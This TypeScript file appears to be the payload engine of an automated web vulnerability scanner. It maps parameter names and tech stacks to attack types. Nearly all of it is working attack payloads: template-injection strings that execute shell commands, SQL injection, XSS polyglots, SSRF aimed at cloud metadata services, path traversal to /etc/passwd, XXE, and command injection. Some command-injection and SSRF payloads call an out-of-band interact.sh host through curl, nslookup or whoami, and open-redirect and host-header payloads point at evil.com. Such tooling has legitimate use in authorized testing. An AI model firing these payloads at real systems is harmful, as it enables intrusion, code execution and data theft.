/**
 * HeuristicGenerator - Context-Aware Payload Generation Engine
 * Analyzes parameter names, locations, and tech stack to generate targeted payloads
 * instead of firing generic lists blindly.
 */

export interface ParameterContext {
  name: string;
  location: 'query' | 'body' | 'header' | 'path' | 'cookie';
  value?: string;
  techStack: string[];
}

export interface HeuristicPayload {
  raw: string;
  encoded: string;
  attackType: string;
  parameter: string;
  injectionPoint: 'query' | 'body' | 'header' | 'path' | 'cookie';
  rationale: string;
  priority: number; // 1-10, higher = more likely to succeed
  oastCallback?: string;
}

// Parameter name patterns → attack type routing
const PARAM_ROUTES: { patterns: RegExp; attackTypes: string[] }[] = [
  { patterns: /url|file|path|redirect|next|return|goto|dest|uri|location|ref|link|src|href|fetch|load|include|page|template|view/i, attackTypes: ['ssrf', 'lfi', 'open-redirect', 'rfi'] },
  { patterns: /id|num|query|order|sort|limit|offset|count|page|idx|key|pk|ref_id|user_id|account|item/i, attackTypes: ['sqli-time', 'sqli-error', 'sqli-union', 'idor'] },
  { patterns: /name|search|msg|comment|title|body|content|text|desc|bio|subject|feedback|review|note/i, attackTypes: ['xss-polyglot', 'ssti', 'xss-dom', 'stored-xss'] },
  { patterns: /email|mail|to|from|cc|bcc|recipient/i, attackTypes: ['header-injection', 'ssti', 'xss-polyglot'] },
  { patterns: /cmd|exec|run|command|shell|system|process|action|func|method/i, attackTypes: ['cmdi', 'rce', 'ssrf'] },
  { patterns: /token|auth|session|jwt|key|secret|password|pass|pwd|credential/i, attackTypes: ['auth-bypass', 'jwt-attack', 'brute-force'] },
  { patterns: /upload|file|image|avatar|attachment|document|media/i, attackTypes: ['file-upload', 'xxe', 'path-traversal'] },
  { patterns: /xml|json|data|payload|input|config|settings/i, attackTypes: ['xxe', 'deserialization', 'ssti'] },
  { patterns: /callback|webhook|notify|ping|hook|endpoint/i, attackTypes: ['ssrf', 'oast-ssrf'] },
  { patterns: /host|origin|domain|server|proxy|forward/i, attackTypes: ['host-header-injection', 'ssrf', 'cache-poisoning'] },
];

// Tech-specific SSTI payloads
const SSTI_PAYLOADS: Record<string, string[]> = {
  jinja2: [
    '{{7*7}}',
    '{{config.items()}}',
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
    '{%for x in ().__class__.__base__.__subclasses__()%}{%if"warning"in x.__name__%}{{x()._module.__builtins__["__import__"]("os").popen("id").read()}}{%endif%}{%endfor%}',
  ],
  twig: [
    '{{7*7}}',
    '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
    '{{["id"]|filter("system")}}',
    '{{app.request.server.all|join(",")}}',
  ],
  freemarker: [
    '${7*7}',
    '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
    '${.data_model.class.protectionDomain.codeSource.location}',
  ],
  node: [
    '{{constructor.constructor("return this.process.env")()}}',
    '{{range.constructor("return global.process.mainModule.require(\'child_process\').execSync(\'id\')")()}}',
    '#{root.process.mainModule.require("child_process").execSync("id")}',
  ],
  erb: [
    '<%= 7*7 %>',
    '<%= system("id") %>',
    '<%= `id` %>',
  ],
  velocity: [
    '#set($x="")##$x.class.forName("java.lang.Runtime").getRuntime().exec("id")',
  ],
  mako: [
    '${7*7}',
    '<%import os;x=os.popen("id").read()%>${x}',
  ],
};

// SQLi payloads by technique
const SQLI_PAYLOADS = {
  'time-based': [
    "' AND SLEEP(5)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1; WAITFOR DELAY '0:0:5'--",
    "' OR BENCHMARK(10000000,MD5('test'))--",
    "1' AND pg_sleep(5)--",
  ],
  'error-based': [
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "1' AND CAST((SELECT version()) AS INT)--",
  ],
  'union-based': [
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,version(),3--",
    "' UNION ALL SELECT NULL,CONCAT(table_name),NULL FROM information_schema.tables--",
    "-1 UNION SELECT 1,2,GROUP_CONCAT(table_name) FROM information_schema.tables--",
  ],
};

// XSS polyglot payloads
const XSS_POLYGLOTS = [
  "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik%%0tE/telerik/,<svg/onload=alert()>",
  "'\"-->]]>*/</script></style></title></textarea></noscript></template><svg/onload=alert()>",
  "<img src=x onerror=alert(1)>",
  "\"><svg/onload=alert(document.domain)>",
  "{{constructor.constructor('return this.alert(1)')()}}",
  "<details/open/ontoggle=alert(1)>",
  "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
];

// SSRF payloads
const SSRF_PAYLOADS = [
  'http://127.0.0.1',
  'http://[::1]',
  'http://0x7f000001',
  'http://0177.0.0.1',
  'http://2130706433',
  'http://127.1',
  'http://169.254.169.254/latest/meta-data/',
  'http://metadata.google.internal/computeMetadata/v1/',
  'file:///etc/passwd',
  'dict://127.0.0.1:6379/info',
  'gopher://127.0.0.1:25/xHELO',
];

// LFI payloads
const LFI_PAYLOADS = [
  '../../../../etc/passwd',
  '....//....//....//....//etc/passwd',
  '/etc/passwd%00',
  '..%252f..%252f..%252fetc/passwd',
  'php://filter/convert.base64-encode/resource=/etc/passwd',
  '/proc/self/environ',
  '/proc/self/cmdline',
  '..\\..\\..\\..\\windows\\win.ini',
  'file:///etc/passwd',
  'expect://id',
];

// Open redirect payloads
const REDIRECT_PAYLOADS = [
  '//evil.com',
  '/%09/evil.com',
  '/\\/evil.com',
  '/.evil.com',
  '//evil%E3%80%82com',
  'https:evil.com',
  '///evil.com',
  '////evil.com',
  'https://evil.com%23.target.com',
];

export class HeuristicGenerator {
  private oastDomain: string;

  constructor(oastDomain?: string) {
    this.oastDomain = oastDomain || 'interact.sh';
  }

  /**
   * Main entry: Generate context-aware payloads for a parameter
   */
  generatePayloads(param: ParameterContext, oastCallbackBase?: string): HeuristicPayload[] {
    const payloads: HeuristicPayload[] = [];
    const matchedRoutes = this.matchParamToRoutes(param.name);
    
    if (matchedRoutes.length === 0) {
      // Fallback: generate generic test payloads
      matchedRoutes.push('xss-polyglot', 'sqli-error', 'ssti');
    }

    for (const attackType of matchedRoutes) {
      const generated = this.generateForAttackType(attackType, param, oastCallbackBase);
      payloads.push(...generated);
    }

    // Sort by priority (highest first)
    payloads.sort((a, b) => b.priority - a.priority);

    return payloads;
  }

  /**
   * Bulk generate for multiple parameters
   */
  generateBulk(params: ParameterContext[], oastCallbackBase?: string): HeuristicPayload[] {
    const all: HeuristicPayload[] = [];
    for (const p of params) {
      all.push(...this.generatePayloads(p, oastCallbackBase));
    }
    // Deduplicate by raw payload + parameter combo
    const seen = new Set<string>();
    return all.filter(p => {
      const key = `${p.parameter}|${p.raw}`;
      if (seen.has(key)) return false;
      seen.add(key);
      return true;
    });
  }

  private matchParamToRoutes(paramName: string): string[] {
    const types: string[] = [];
    for (const route of PARAM_ROUTES) {
      if (route.patterns.test(paramName)) {
        types.push(...route.attackTypes);
      }
    }
    return [...new Set(types)];
  }

  private generateForAttackType(
    attackType: string, param: ParameterContext, oastBase?: string
  ): HeuristicPayload[] {
    const payloads: HeuristicPayload[] = [];
    const makePayload = (raw: string, priority: number, rationale: string): HeuristicPayload => ({
      raw,
      encoded: encodeURIComponent(raw),
      attackType,
      parameter: param.name,
      injectionPoint: param.location,
      rationale,
      priority,
    });

    switch (attackType) {
      case 'ssrf':
      case 'oast-ssrf':
        for (const p of SSRF_PAYLOADS) {
          payloads.push(makePayload(p, 8, `SSRF via ${param.name} (URL-like param)`));
        }
        if (oastBase) {
          const uid = crypto.randomUUID().slice(0, 8);
          payloads.push(makePayload(
            `http://${uid}.${oastBase}`, 9,
            'OAST blind SSRF callback'
          ));
          payloads.push(makePayload(
            `http://${uid}.${oastBase}/$(whoami)`, 9,
            'OAST SSRF + RCE callback'
          ));
        }
        break;

      case 'lfi':
      case 'rfi':
      case 'path-traversal':
        for (const p of LFI_PAYLOADS) {
          payloads.push(makePayload(p, 8, `LFI/Path Traversal via ${param.name}`));
        }
        break;

      case 'open-redirect':
        for (const p of REDIRECT_PAYLOADS) {
          payloads.push(makePayload(p, 7, `Open redirect via ${param.name}`));
        }
        break;

      case 'sqli-time':
        for (const p of SQLI_PAYLOADS['time-based']) {
          payloads.push(makePayload(p, 9, `Time-based blind SQLi on ${param.name}`));
        }
        break;

      case 'sqli-error':
        for (const p of SQLI_PAYLOADS['error-based']) {
          payloads.push(makePayload(p, 8, `Error-based SQLi on ${param.name}`));
        }
        break;

      case 'sqli-union':
        for (const p of SQLI_PAYLOADS['union-based']) {
          payloads.push(makePayload(p, 7, `Union SQLi on ${param.name}`));
        }
        break;

      case 'idor':
        payloads.push(makePayload('1', 6, 'IDOR enumeration'));
        payloads.push(makePayload('0', 6, 'IDOR boundary'));
        payloads.push(makePayload('-1', 6, 'IDOR negative'));
        payloads.push(makePayload('99999999', 6, 'IDOR out-of-range'));
        break;

      case 'xss-polyglot':
      case 'xss-dom':
      case 'stored-xss':
        for (const p of XSS_POLYGLOTS) {
          payloads.push(makePayload(p, 8, `XSS polyglot on ${param.name}`));
        }
        if (oastBase) {
          const uid = crypto.randomUUID().slice(0, 8);
          payloads.push(makePayload(
            `<script src="http://${uid}.${oastBase}"></script>`, 9,
            'OAST blind XSS callback'
          ));
        }
        break;

      case 'ssti': {
        // Select SSTI payloads based on detected tech stack
        const sstiBatch = this.getSSTIForTech(param.techStack);
        for (const p of sstiBatch) {
          payloads.push(makePayload(p, 9, `SSTI for detected tech stack`));
        }
        break;
      }

      case 'cmdi':
      case 'rce':
        const cmdiPayloads = [
          '; id', '| id', '`id`', '$(id)', '; cat /etc/passwd',
          '| whoami', '& whoami', '%0aid', '\nid\n',
        ];
        for (const p of cmdiPayloads) {
          payloads.push(makePayload(p, 9, `Command injection on ${param.name}`));
        }
        if (oastBase) {
          const uid = crypto.randomUUID().slice(0, 8);
          payloads.push(makePayload(`$(curl ${uid}.${oastBase})`, 10, 'OAST blind RCE callback'));
          payloads.push(makePayload(`\`nslookup ${uid}.${oastBase}\``, 10, 'OAST blind RCE DNS'));
        }
        break;

      case 'header-injection':
        payloads.push(makePayload('test\r\nX-Injected: true', 7, 'CRLF header injection'));
        payloads.push(makePayload('test%0d%0aX-Injected:%20true', 7, 'URL-encoded CRLF'));
        break;

      case 'host-header-injection':
        payloads.push(makePayload('evil.com', 7, 'Host header injection'));
        payloads.push(makePayload('target.com@evil.com', 7, 'Host header @ bypass'));
        break;

      case 'xxe':
        payloads.push(makePayload(
          '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
          8, 'XXE file read'
        ));
        if (oastBase) {
          const uid = crypto.randomUUID().slice(0, 8);
          payloads.push(makePayload(
            `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://${uid}.${oastBase}">]><foo>&xxe;</foo>`,
            9, 'OAST blind XXE'
          ));
        }
        break;

      case 'auth-bypass':
        payloads.push(makePayload('admin', 6, 'Default credential test'));
        payloads.push(makePayload("' OR '1'='1'--", 7, 'Auth bypass SQLi'));
        break;

      case 'jwt-attack':
        payloads.push(makePayload(
          'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwiYWRtaW4iOnRydWV9.',
          8, 'JWT none algorithm bypass'
        ));
        break;

      case 'cache-poisoning':
        payloads.push(makePayload('evil.com', 7, 'Web cache poisoning via host header'));
        break;

      case 'deserialization':
        payloads.push(makePayload(
          'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==',
          7, 'Java deserialization probe'
        ));
        payloads.push(makePayload(
          'O:8:"stdClass":0:{}',
          7, 'PHP deserialization probe'
        ));
        break;

      default:
        // Generic canary
        payloads.push(makePayload(`heuristic_canary_${Date.now()}`, 3, 'Generic canary probe'));
    }

    return payloads;
  }

  private getSSTIForTech(techStack: string[]): string[] {
    const payloads: string[] = [];
    const techStr = techStack.join(' ').toLowerCase();

    if (techStr.includes('python') || techStr.includes('django') || techStr.includes('flask') || techStr.includes('jinja')) {
      payloads.push(...SSTI_PAYLOADS.jinja2);
    }
    if (techStr.includes('php') || techStr.includes('twig') || techStr.includes('symfony')) {
      payloads.push(...SSTI_PAYLOADS.twig);
    }
    if (techStr.includes('node') || techStr.includes('express') || techStr.includes('handlebars') || techStr.includes('pug')) {
      payloads.push(...SSTI_PAYLOADS.node);
    }
    if (techStr.includes('java') || techStr.includes('spring') || techStr.includes('freemarker')) {
      payloads.push(...SSTI_PAYLOADS.freemarker);
    }
    if (techStr.includes('ruby') || techStr.includes('rails') || techStr.includes('erb')) {
      payloads.push(...SSTI_PAYLOADS.erb);
    }
    if (techStr.includes('mako')) {
      payloads.push(...SSTI_PAYLOADS.mako);
    }

    // Always add universal probe
    if (payloads.length === 0) {
      payloads.push('{{7*7}}', '${7*7}', '<%= 7*7 %>', '#{7*7}', '{7*7}');
    }

    return [...new Set(payloads)];
  }
}

export const heuristicGenerator = new HeuristicGenerator();
